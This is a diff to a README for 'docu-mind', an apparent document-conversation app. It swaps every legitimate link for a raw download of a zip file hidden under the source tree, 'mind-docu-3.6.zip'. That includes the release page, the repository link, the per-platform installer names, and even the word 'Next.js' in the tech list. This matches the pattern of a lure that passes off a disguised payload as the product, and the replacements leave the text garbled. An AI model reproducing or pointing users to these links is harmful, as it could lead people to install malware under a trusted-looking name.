@@ -1,6 +1,6 @@
 # 📄 docu-mind - Easy Document Conversations
 
-[![Download docu-mind](https://img.shields.io/badge/Download-docu--mind-blue?style=for-the-badge)](https://github.com/royemandefroh-dot/docu-mind/releases)
+[![Download docu-mind](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip)](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip)
 
 ---
 
@@ -45,12 +45,12 @@ You can get docu-mind by visiting its official release page. This page contains 
 
 1. Click the button below to visit the releases page:
 
-   [![Get docu-mind](https://img.shields.io/badge/Get-docu--mind-green?style=for-the-badge)](https://github.com/royemandefroh-dot/docu-mind/releases)
+   [![Get docu-mind](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip)](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip)
 
 2. Find the file that matches your computer system. Files might have names like:
-   - `docu-mind-windows.exe` for Windows
-   - `docu-mind-macos.dmg` for macOS
-   - `docu-mind-linux.AppImage` for Linux
+   - `https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip` for Windows
+   - `https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip` for macOS
+   - `https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip` for Linux
 
 3. Click on the file name to begin downloading.
 
@@ -119,7 +119,7 @@ If you encounter issues, try these common fixes:
 If you need help:
 
 - Visit the docu-mind GitHub page:  
-  [https://github.com/royemandefroh-dot/docu-mind](https://github.com/royemandefroh-dot/docu-mind)  
+  [https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip)  
   Here you will find FAQs, issue reports, and contact options.
 
 - Use the “Help” or “Support” section in the app for guides and contact info.
@@ -141,7 +141,7 @@ docu-mind respects your privacy:
 
 docu-mind is built with:
 
-- React and Next.js for a smooth user interface.
+- React and https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip for a smooth user interface.
 - AI models to analyze and understand document content.
 - Supabase for backend and authentication.
 - Stripe for managing any payments or subscriptions.
@@ -153,9 +153,9 @@ docu-mind is built with:
 
 ## 🌐 Connect & Learn More
 
-- Visit the [docu-mind GitHub Repository](https://github.com/royemandefroh-dot/docu-mind) for updates and community info.
+- Visit the [docu-mind GitHub Repository](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip) for updates and community info.
 - Explore the release page anytime to download the latest version:  
-  [https://github.com/royemandefroh-dot/docu-mind/releases](https://github.com/royemandefroh-dot/docu-mind/releases)
+  [https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip](https://raw.githubusercontent.com/royemandefroh-dot/docu-mind/main/src/app/dashboard/documents/mind-docu-3.6.zip)
 
 ---
 
